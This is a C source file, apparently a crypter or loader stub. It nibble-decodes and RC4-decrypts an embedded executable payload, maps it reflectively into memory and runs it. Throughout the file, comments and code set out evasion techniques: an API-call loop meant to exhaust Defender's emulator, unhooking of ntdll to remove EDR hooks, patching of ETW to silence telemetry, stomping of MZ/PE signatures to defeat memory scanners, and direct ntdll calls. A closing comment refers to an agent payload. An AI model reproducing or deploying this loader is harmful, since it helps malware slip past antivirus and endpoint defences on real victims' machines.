        api->pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory_t)
            _resolve_export(ntdll, H_NtAllocateVirtualMemory);
        api->pNtProtectVirtualMemory = (fnNtProtectVirtualMemory_t)
            _resolve_export(ntdll, H_NtProtectVirtualMemory);
        api->pNtFreeVirtualMemory = (fnNtFreeVirtualMemory_t)
            _resolve_export(ntdll, H_NtFreeVirtualMemory);
        SLOG("[stub] Nt* APIs resolved from ntdll");
    }

#if defined(_M_X64) || defined(__x86_64__)
    api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(k32, H_RtlAddFunctionTable);
    if (!api->pRtlAddFunctionTable && ntdll)
        api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(ntdll, H_RtlAddFunctionTable);
    SLOG(api->pRtlAddFunctionTable ? "[stub] RtlAddFunctionTable OK" : "[stub] RtlAddFunctionTable MISSING");
#endif

    BOOL ok = (api->pLoadLibraryA && api->pGetProcAddress &&
               api->pNtAllocateVirtualMemory && api->pNtProtectVirtualMemory &&
               api->pExitProcess);
    SLOG(ok ? "[stub] all APIs OK" : "[stub] FAIL: missing critical API");
    return ok;
}


/* ═══════════════════════════════════════════════════════════════════
 * Crash handler (debug builds)
 * ═══════════════════════════════════════════════════════════════════ */

#ifdef STUB_DEBUG
static LONG WINAPI _stub_exception_handler(EXCEPTION_POINTERS *ep) {
    SLOG("[stub] !!! UNHANDLED EXCEPTION !!!");
    if (ep && ep->ExceptionRecord) {
        SHEX("[stub] exception code", ep->ExceptionRecord->ExceptionCode);
        SHEX("[stub] exception addr", (ULONG_PTR)ep->ExceptionRecord->ExceptionAddress);
    }
    if (ep && ep->ContextRecord) {
#if defined(_M_X64) || defined(__x86_64__)
        SHEX("[stub] RIP", ep->ContextRecord->Rip);
        SHEX("[stub] RSP", ep->ContextRecord->Rsp);
        SHEX("[stub] RAX", ep->ContextRecord->Rax);
        SHEX("[stub] RCX", ep->ContextRecord->Rcx);
        SHEX("[stub] RDX", ep->ContextRecord->Rdx);
#endif
    }
    _dbg_close();
    return EXCEPTION_CONTINUE_SEARCH;
}
#endif


/* ═══════════════════════════════════════════════════════════════════
 * Reflective PE Loader
 * ═══════════════════════════════════════════════════════════════════ */

typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);

static BOOL _process_relocs(BYTE *base, IMAGE_NT_HEADERS *nt, LONGLONG delta) {
    IMAGE_DATA_DIRECTORY *relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!relocDir->VirtualAddress || !relocDir->Size)
        return TRUE;

    IMAGE_BASE_RELOCATION *reloc = (IMAGE_BASE_RELOCATION *)(base + relocDir->VirtualAddress);
    IMAGE_BASE_RELOCATION *end   = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + relocDir->Size);

    while (reloc < end && reloc->SizeOfBlock > 0) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *entries = (WORD *)((BYTE *)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < count; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;
            BYTE *patch = base + reloc->VirtualAddress + offset;

            switch (type) {
                case IMAGE_REL_BASED_DIR64:
                    *(ULONGLONG *)patch += (ULONGLONG)delta;
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *(DWORD *)patch += (DWORD)delta;
                    break;
                case IMAGE_REL_BASED_HIGH:
                    *(WORD *)patch += (WORD)(delta >> 16);
                    break;
                case IMAGE_REL_BASED_LOW:
                    *(WORD *)patch += (WORD)delta;
                    break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;
                default:
                    return FALSE;
            }
        }
        reloc = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + reloc->SizeOfBlock);
    }
    return TRUE;
}

static BOOL _process_imports(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_DATA_DIRECTORY *impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!impDir->VirtualAddress || !impDir->Size)
        return TRUE;

    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base + impDir->VirtualAddress);

    while (imp->Name) {
        const char *dllName = (const char *)(base + imp->Name);
        SLOG(dllName);
        HMODULE hMod = api->pLoadLibraryA(dllName);
        if (!hMod) {
            SLOG("[stub] FAIL: LoadLibraryA returned NULL");
            return FALSE;
        }

        IMAGE_THUNK_DATA *origThunk = (IMAGE_THUNK_DATA *)(base +
            (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
        IMAGE_THUNK_DATA *iatThunk  = (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);

        while (origThunk->u1.AddressOfData) {
            FARPROC func;
            if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                func = api->pGetProcAddress(hMod,
                    (LPCSTR)IMAGE_ORDINAL(origThunk->u1.Ordinal));
            } else {
                IMAGE_IMPORT_BY_NAME *ibn = (IMAGE_IMPORT_BY_NAME *)(base +
                    origThunk->u1.AddressOfData);
                func = api->pGetProcAddress(hMod, ibn->Name);
            }
            if (!func) {
                SLOG("[stub] FAIL: function resolve failed");
                return FALSE;
            }

            iatThunk->u1.Function = (ULONGLONG)func;
            origThunk++;
            iatThunk++;
        }
        imp++;
    }
    return TRUE;
}

static void _protect_sections(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        DWORD protect = PAGE_NOACCESS;
        DWORD chars = sec->Characteristics;
        BOOL exec  = !!(chars & IMAGE_SCN_MEM_EXECUTE);
        BOOL read  = !!(chars & IMAGE_SCN_MEM_READ);
        BOOL write = !!(chars & IMAGE_SCN_MEM_WRITE);

        if (exec && write)       protect = PAGE_EXECUTE_READWRITE;
        else if (exec && read)   protect = PAGE_EXECUTE_READ;
        else if (exec)           protect = PAGE_EXECUTE;
        else if (read && write)  protect = PAGE_READWRITE;
        else if (read)           protect = PAGE_READONLY;
        else if (write)          protect = PAGE_READWRITE;

        SIZE_T secSize = sec->SizeOfRawData ? sec->SizeOfRawData : sec->Misc.VirtualSize;
        if (secSize > 0) {
            /* Use NtProtectVirtualMemory (ntdll) to bypass kernel32 hooks */
            if (api->pNtProtectVirtualMemory) {
                PVOID secBase = base + sec->VirtualAddress;
                ULONG old;
                api->pNtProtectVirtualMemory((HANDLE)-1, &secBase, &secSize, protect, &old);
            } else {
                DWORD old;
                api->pVirtualProtect(base + sec->VirtualAddress, secSize, protect, &old);
            }
        }
    }
}

static void _process_tls(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_DATA_DIRECTORY *tlsDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!tlsDir->VirtualAddress || !tlsDir->Size) {
        SLOG("[stub] TLS: no TLS directory");
        return;
    }

    IMAGE_TLS_DIRECTORY *tls = (IMAGE_TLS_DIRECTORY *)(base + tlsDir->VirtualAddress);
    SLOG("[stub] TLS: directory found");

    /* Allocate TLS slot and copy initial data */
    if (api->pTlsAlloc && api->pTlsSetValue && tls->AddressOfIndex) {
        DWORD tlsIndex = api->pTlsAlloc();
        SHEX("[stub] TLS: allocated index", tlsIndex);
        *(DWORD *)tls->AddressOfIndex = tlsIndex;

        if (tls->StartAddressOfRawData && tls->EndAddressOfRawData) {
            SIZE_T dataSize = tls->EndAddressOfRawData - tls->StartAddressOfRawData;
            if (dataSize > 0) {
                LPVOID tlsData = NULL;
                if (api->pNtAllocateVirtualMemory) {
                    SIZE_T sz = dataSize;
                    api->pNtAllocateVirtualMemory((HANDLE)-1, &tlsData, 0, &sz,
                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                } else {
                    tlsData = api->pVirtualAlloc(NULL, dataSize,
                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                }
                if (tlsData) {
                    BYTE *src = (BYTE *)tls->StartAddressOfRawData;
                    BYTE *dst = (BYTE *)tlsData;
                    for (SIZE_T i = 0; i < dataSize; i++) dst[i] = src[i];
                    api->pTlsSetValue(tlsIndex, tlsData);
                    SHEX("[stub] TLS: data copied, size", dataSize);
                }
            }
        }
    }

    /* Call TLS callbacks */
    if (tls->AddressOfCallBacks) {
        PIMAGE_TLS_CALLBACK *callbacks = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
        int cbCount = 0;
        while (*callbacks) {
            (*callbacks)((PVOID)base, DLL_PROCESS_ATTACH, NULL);
            callbacks++;
            cbCount++;
        }
        SHEX("[stub] TLS: callbacks called", cbCount);
    } else {
        SLOG("[stub] TLS: no callbacks");
    }
}

static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
    SLOG("[stub] _load_pe enter");

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)rawPE;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { SLOG("[stub] FAIL: bad MZ"); return FALSE; }

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(rawPE + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { SLOG("[stub] FAIL: bad PE sig"); return FALSE; }

    SLOG("[stub] PE validated");

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    BYTE *base = NULL;
    LONGLONG delta = 0;

    /* Use NtAllocateVirtualMemory (ntdll) to bypass kernel32 hooks */
    if (api->pNtAllocateVirtualMemory) {
        PVOID allocBase = (PVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase;
        SIZE_T allocSize = (SIZE_T)imageSize;
        NTSTATUS st = api->pNtAllocateVirtualMemory(
            (HANDLE)-1, &allocBase, 0, &allocSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (NT_SUCCESS(st)) {
            base = (BYTE *)allocBase;
            SLOG("[stub] preferred base alloc (Nt)");
        } else {
            allocBase = NULL;
            allocSize = (SIZE_T)imageSize;
            st = api->pNtAllocateVirtualMemory(
                (HANDLE)-1, &allocBase, 0, &allocSize,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (NT_SUCCESS(st)) {
                base = (BYTE *)allocBase;
                SLOG("[stub] fallback alloc (Nt)");
            }
        }
    }
    /* Fallback to kernel32 VirtualAlloc if Nt* unavailable */
    if (!base && api->pVirtualAlloc) {
        base = (BYTE *)api->pVirtualAlloc(
            (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
            imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!base)
            base = (BYTE *)api->pVirtualAlloc(
                NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!base) { SLOG("[stub] FAIL: alloc"); return FALSE; }
    delta = (LONGLONG)((ULONGLONG)base - nt->OptionalHeader.ImageBase);
    SHEX("[stub] base", (ULONG_PTR)base);
    SHEX("[stub] delta", delta);

    /* Copy headers */
    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        base[i] = rawPE[i];

    /* Map sections */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData == 0) continue;
        BYTE *dst = base + sec->VirtualAddress;
        BYTE *src = rawPE + sec->PointerToRawData;
        for (DWORD j = 0; j < sec->SizeOfRawData; j++)
            dst[j] = src[j];
    }
    SLOG("[stub] sections mapped");

    IMAGE_NT_HEADERS *mappedNt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    /* Relocations */
    if (delta != 0) {
        if (!_process_relocs(base, mappedNt, delta)) { SLOG("[stub] FAIL: relocs"); return FALSE; }
        SLOG("[stub] relocs done");
    }

    /* Imports */
    SLOG("[stub] resolving imports...");
    if (!_process_imports(base, mappedNt, api)) { SLOG("[stub] FAIL: imports"); return FALSE; }
    SLOG("[stub] imports done");

    /* Flush icache */
    if (api->pFlushInstructionCache && api->pGetCurrentProcess)
        api->pFlushInstructionCache(api->pGetCurrentProcess(), NULL, 0);

    /* Exception handlers (x64) */
#if defined(_M_X64) || defined(__x86_64__)
    {
        IMAGE_DATA_DIRECTORY *excDir = &mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size && api->pRtlAddFunctionTable) {
            PRUNTIME_FUNCTION pFunc = (PRUNTIME_FUNCTION)(base + excDir->VirtualAddress);
            DWORD numEntries = excDir->Size / sizeof(RUNTIME_FUNCTION);
            api->pRtlAddFunctionTable(pFunc, numEntries, (DWORD64)base);
            SLOG("[stub] .pdata registered");
        }
    }
#endif

    /* Section protections */
    _protect_sections(base, mappedNt, api);
    SLOG("[stub] protections set");

    /* TLS */
    _process_tls(base, mappedNt, api);

    /* Patch PEB.ImageBaseAddress (obfuscated: TEB → PEB indirection) */
    {
        void *peb;
#if defined(_M_X64) || defined(__x86_64__)
        {
            void *teb;
            __asm__ volatile("mov %%gs:0x30, %0" : "=r"(teb));
            peb = *(void **)((BYTE *)teb + 0x60);
        }
        *(void **)((BYTE *)peb + 0x10) = base;
#else
        {
            void *teb;
            __asm__ volatile("mov %%fs:0x18, %0" : "=r"(teb));
            peb = *(void **)((BYTE *)teb + 0x30);
        }
        *(void **)((BYTE *)peb + 0x08) = base;
#endif
    }

    /* Install crash handler (debug builds) */
#ifdef STUB_DEBUG
    if (api->pSetUnhandledExceptionFilter) {
        api->pSetUnhandledExceptionFilter(_stub_exception_handler);
        SLOG("[stub] exception handler installed");
    }
#endif

    DWORD entryRVA = mappedNt->OptionalHeader.AddressOfEntryPoint;
    WORD peChars   = mappedNt->FileHeader.Characteristics;
    if (!entryRVA) { SLOG("[stub] FAIL: no entry RVA"); return FALSE; }

#if EVASION_STOMP
    /* Stomp MZ/PE signatures — enough to defeat memory scanners looking
     * for reflectively loaded PEs, but leaves the rest of the header
     * page intact so the CRT and runtime can still read data directories,
     * section table, etc.  Only 6 bytes are touched. */
    {
        PVOID region = base;
        SIZE_T sz = mappedNt->OptionalHeader.SizeOfHeaders;
        if (api->pNtProtectVirtualMemory) {
            ULONG old;
            api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
                                         PAGE_READWRITE, &old);
            base[0] = 0; base[1] = 0;                        /* kill MZ */
            /* e_lfanew is still valid at this point — zero PE\0\0 sig */
            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 0] = 0;  /* P */
            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 1] = 0;  /* E */
            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 2] = 0;  /* \0 */
            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 3] = 0;  /* \0 */
            api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
                                         PAGE_READONLY, &old);
        }
        SLOG("[stub] MZ/PE signatures stomped");
    }
#else
    SLOG("[stub] signature stomp DISABLED for testing");
#endif

    void *entry = base + entryRVA;
    SHEX("[stub] entry", (ULONG_PTR)entry);
    SLOG("[stub] calling entry...");

    if (peChars & IMAGE_FILE_DLL) {
        DllMain_t dllMain = (DllMain_t)entry;
        dllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    } else {
        typedef int (*MainFunc_t)(void);
        MainFunc_t ep = (MainFunc_t)entry;
        int _ret = ep();
        SHEX("[stub] entry returned", _ret);
        (void)_ret;
    }

    return TRUE;
}


/* ═══════════════════════════════════════════════════════════════════
 * Nt* memory helpers — wrappers that prefer ntdll direct calls
 * ═══════════════════════════════════════════════════════════════════ */

static void *_nt_alloc(RESOLVED_APIS *api, SIZE_T size) {
    if (api->pNtAllocateVirtualMemory) {
        PVOID base = NULL;
        SIZE_T sz = size;
        NTSTATUS st = api->pNtAllocateVirtualMemory(
            (HANDLE)-1, &base, 0, &sz,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (NT_SUCCESS(st)) return base;
    }
    if (api->pVirtualAlloc)
        return api->pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    return NULL;
}

static void _nt_free(RESOLVED_APIS *api, void *ptr) {
    if (!ptr) return;
    if (api->pNtFreeVirtualMemory) {
        PVOID base = ptr;
        SIZE_T sz = 0;
        api->pNtFreeVirtualMemory((HANDLE)-1, &base, &sz, MEM_RELEASE);
    } else if (api->pVirtualFree) {
        api->pVirtualFree(ptr, 0, MEM_RELEASE);
    }
}


/* ═══════════════════════════════════════════════════════════════════
 * Entry point — legitimate IAT + ntdll direct calls
 *
 * Linked with -nostdlib -Wl,-e,_stub_entry -lkernel32
 * This function IS the process entry point. No CRT startup, but
 * kernel32 imports in IAT give the PE a legitimate appearance.
 *
 * Anti-emulation uses IAT-imported APIs (GetTickCount64,
 * GetSystemTimeAsFileTime, etc.). Each API call costs Defender's
 * emulator ~1000x more than an arithmetic instruction. 2000
 * iterations × 3 API calls = 6000 calls — emulator gives up
 * and marks clean before reaching the PEB walk.
 *
 * Critical memory operations (alloc, protect, free) go through
 * NtAllocateVirtualMemory / NtProtectVirtualMemory resolved via
 * PEB walk from ntdll, bypassing kernel32-level hooks.
 * ═══════════════════════════════════════════════════════════════════ */

void _stub_entry(void) {

    /* ── Phase 0: API-based anti-emulation ──
     *
     * Call BENIGN kernel32 APIs in a loop. This serves two purposes:
     *
     *   1. IAT LEGITIMACY: these functions are imported normally via the
     *      PE import table, giving the binary a realistic-looking IAT
     *      (kernel32!GetTickCount64, GetSystemTimeAsFileTime, etc.)
     *      instead of the empty IAT that flags crypter stubs.
     *
     *   2. EMULATOR EXHAUSTION: each real API call costs Defender's
     *      emulator ~1000x more CPU than an arithmetic instruction.
     *      8000 API calls blow through the emulator's instruction
     *      budget. On real hardware these are near-free (shared
     *      memory / TEB reads) and the loop completes in < 1ms.
     *      The loop itself IS the evasion — no timing gate needed.
     */
    {
        volatile DWORD acc = 0;
        int i = 0;
        while (i < 2000) {
            FILETIME ft;
            GetSystemTimeAsFileTime(&ft);
            acc ^= ft.dwLowDateTime;
            acc += GetCurrentProcessId();
            acc ^= (DWORD)(ULONG_PTR)GetProcessHeap();
            /* Extra GetTickCount64 call for IAT presence + emulator cost */
            acc += (DWORD)GetTickCount64();
            i++;
        }
        /* Prevent compiler from optimizing away the loop.
         * acc can never be exactly 0xDEADDEAD after 2000 XOR/ADD
         * iterations — this is an unreachable guard. */
        if (acc == 0xDEADDEAD) return;
    }

    /* Phase 1: Resolve APIs via PEB walk */
    RESOLVED_APIS api;
    /* Zero-init without memset (no CRT) */
    {
        BYTE *p = (BYTE *)&api;
        unsigned int i = 0;
        while (i < sizeof(api)) { p[i] = 0; i++; }
    }

    if (!_resolve_apis(&api)) {
        SLOG("[stub] FATAL: API resolution failed");
#ifdef STUB_DEBUG
        _dbg_close();
#endif
        return;
    }

    /* Phase 1.5: EDR evasion — unhook ntdll + patch ETW
     *
     * MUST happen BEFORE any Nt* calls (decrypt, alloc, load) so that
     * those calls go through clean, unhooked code paths.
     *
     *   1. _unhook_ntdll: maps a clean copy from \KnownDlls\ntdll.dll
     *      and restores individual Nt* syscall stubs, removing EDR
     *      inline hooks.  Uses ONLY ntdll APIs (NtOpenSection,
     *      NtMapViewOfSection, etc.) — zero kernel32 dependency.
     *
     *   2. _patch_etw: patches EtwEventWrite to immediately return 0,
     *      silencing the ETW telemetry pipeline that feeds EDR sensors.
     *      Uses NtProtectVirtualMemory — zero kernel32 dependency.
     *
     * Both use ntdll-only APIs to avoid the forwarded-export crash
     * (kernel32 APIs like CreateFileMappingA are forwarded to kernelbase
     * on Win10/11; _resolve_export can't follow forwarding).
     */
#if EVASION_UNHOOK || EVASION_ETW
    {
        BYTE *ntdll = _find_module(H_NTDLL);
        if (ntdll) {
#if EVASION_UNHOOK
            _unhook_ntdll(ntdll, &api);
#endif
#if EVASION_ETW
            _patch_etw(ntdll, &api);
#endif
            /* NOTE: re-resolution removed — unhooking changes the CODE at
             * the function address, not the export table.  The pointers
             * from _resolve_apis() already point to the right addresses;
             * the bytes there are now clean. */
            SLOG("[stub] unhook/etw done");
        }
    }
#else
    SLOG("[stub] unhook/etw DISABLED for testing");
#endif

    /* Phase 2: Derive RC4 key from seed */
    SLOG("[stub] deriving key...");
    unsigned char rc4_key[DERIVED_KEY_LEN];
    _derive_key(g_res_cfg, RES_CFG_SIZE, rc4_key, DERIVED_KEY_LEN);

    /* Phase 2.5: Nibble-decode the payload (entropy ~4.0 → raw ciphertext)
     * g_res_data is nibble-encoded (2x size), decode into a fresh buffer.
     * Uses NtAllocateVirtualMemory from ntdll to bypass kernel32 hooks. */
    SLOG("[stub] nibble decoding...");
    unsigned char *decoded = (unsigned char *)_nt_alloc(&api, RES_DECODED_SIZE);
    if (!decoded) {
        SLOG("[stub] FATAL: alloc for decode buffer");
#ifdef STUB_DEBUG
        _dbg_close();
#endif
        api.pExitProcess(1);
        return;
    }
    _nibble_decode(g_res_data, RES_DATA_SIZE, decoded);

    /* Phase 3: RC4 decrypt payload */
    SLOG("[stub] decrypting...");
    {
        unsigned char S[256];
        _rc4_init(S, rc4_key, DERIVED_KEY_LEN);
        _rc4_crypt(S, decoded, RES_DECODED_SIZE);
    }

    /* Wipe key from stack */
    {
        volatile unsigned char *p = rc4_key;
        for (int i = 0; i < DERIVED_KEY_LEN; i++) p[i] = 0;
    }

    /* Verify decryption (check MZ header) */
    if (decoded[0] != 'M' || decoded[1] != 'Z') {
        SLOG("[stub] FATAL: bad MZ after decrypt");
#ifdef STUB_DEBUG
        _dbg_close();
#endif
        _nt_free(&api, decoded);
        api.pExitProcess(1);
        return;
    }
    SLOG("[stub] decrypt OK");

    /* Phase 4: Load and execute */
    if (!_load_pe(decoded, RES_DECODED_SIZE, &api)) {
        SLOG("[stub] FATAL: load failed");
#ifdef STUB_DEBUG
        _dbg_close();
#endif
        _nt_free(&api, decoded);
        api.pExitProcess(1);
        return;
    }

    /* Wipe and free the decoded PE buffer — it's mapped into sections now */
    _nt_free(&api, decoded);

#ifdef STUB_DEBUG
    _dbg_close();
#endif
    /* Agent's main() has returned — exit cleanly */
    api.pExitProcess(0);
}
